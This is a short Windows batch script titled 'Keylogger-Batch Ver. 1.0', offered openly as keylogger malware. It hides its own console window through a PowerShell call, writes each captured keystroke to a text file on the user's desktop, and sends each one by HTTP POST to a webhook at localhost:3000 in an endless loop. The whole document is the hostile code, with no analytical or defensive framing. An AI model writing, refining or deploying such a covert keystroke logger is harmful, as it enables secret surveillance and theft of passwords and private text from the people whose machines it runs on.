@echo off
cls
title Keylogger-Batch Ver. 1.0

:: Hide the terminal window
powershell -Command "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\"User32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; $consolePtr = [Console.Window]::GetConsoleWindow(); [Console.Window]::ShowWindow($consolePtr, 0)"

:: Create log file if it doesn't exist
if not exist "%userprofile%\desktop\keylogger.txt" (
  echo Keylogger started at %date% %time% > "%userprofile%\desktop\keylogger.txt"
)

:: Main loop to capture and send keystrokes
:loop
:: Capture keystroke using PowerShell
for /f "delims=" %%a in ('powershell -Command "[Console]::ReadKey($true).KeyChar"') do (
  set "key=%%a"
  echo %%a >> "%userprofile%\desktop\keylogger.txt"
  powershell -Command "Invoke-WebRequest -Uri 'http://localhost:3000/webhook' -Method POST -Body '%%a' -ContentType 'text/plain'"
)

:: Wait for 1 second before next iteration
timeout /t 1 /nobreak >nul
goto loop
